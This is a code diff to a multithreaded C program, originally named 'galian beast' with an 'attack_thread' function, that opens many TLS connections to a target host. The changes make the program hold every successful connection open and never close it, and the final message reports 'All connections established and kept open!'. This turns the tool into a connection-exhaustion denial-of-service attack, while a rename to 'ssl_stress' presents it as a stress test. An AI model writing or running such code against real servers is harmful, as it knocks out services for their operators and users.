@@ -1,4 +1,4 @@
-// gcc -o gbeast galian_beast.c -lssl -lcrypto -lpthread
+// gcc -o ssl_stress ssl_stress.c -lssl -lcrypto -lpthread
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -24,13 +24,12 @@
 " \\  \\           | `._   `\\\\  |  //'   _,' |           /  /\\\n" \
 "  `-.\\         /'  _ `---'' , . ``---' _  `\\         /,-'\n" \
 "     ``       /     \\    ,='/ \\`=.    /     \\       ''\n" \
-"\033[0mSSL         * g a l i a n    b e a s t *\n\n"
+"\033[0m                * g a l i a n    b e a s t *\n\n"
 
 atomic_long total_connections = ATOMIC_VAR_INIT(0);
 atomic_long successful_handshakes = ATOMIC_VAR_INIT(0);
 struct sockaddr_in target_addr;
 
-/* Global variables to store target host and thread count */
 const char *g_target_host;
 int g_thread_count;
 
@@ -95,25 +94,27 @@ void* attack_thread(void* arg) {
             }
             SSL_set_fd(ssl, sock);
             if (!SSL_set_tlsext_host_name(ssl, g_target_host)) {
-                /* Optionally handle error */
+                /* Optional error handling */
             }
-
             if (SSL_connect(ssl) == 1) {
                 atomic_fetch_add(&successful_handshakes, 1);
+                /* Connection remains open.
+                   Do not call SSL_shutdown, SSL_free, or close(sock). */
+            } else {
+                SSL_free(ssl);
+                close(sock);
             }
-            
-            SSL_shutdown(ssl);
-            SSL_free(ssl);
             atomic_fetch_add(&total_connections, 1);
+        } else {
+            close(sock);
         }
-        close(sock);
         
         if (i % 10 == 0)
             print_stats();
     }
     
-    SSL_CTX_free(ctx);
     free(config);
+    SSL_CTX_free(ctx);
     return NULL;
 }
 
@@ -162,8 +163,9 @@ int main(int argc, char *argv[]) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("\n\033[32m[+] Stress test completed!\033[0m\n");
-    EVP_cleanup();
+    printf("\n\033[32m[+] All connections established and kept open!\033[0m\n");
+
     free(threads);
+    /* Do not call EVP_cleanup if further SSL operations are expected */
     return EXIT_SUCCESS;
 }
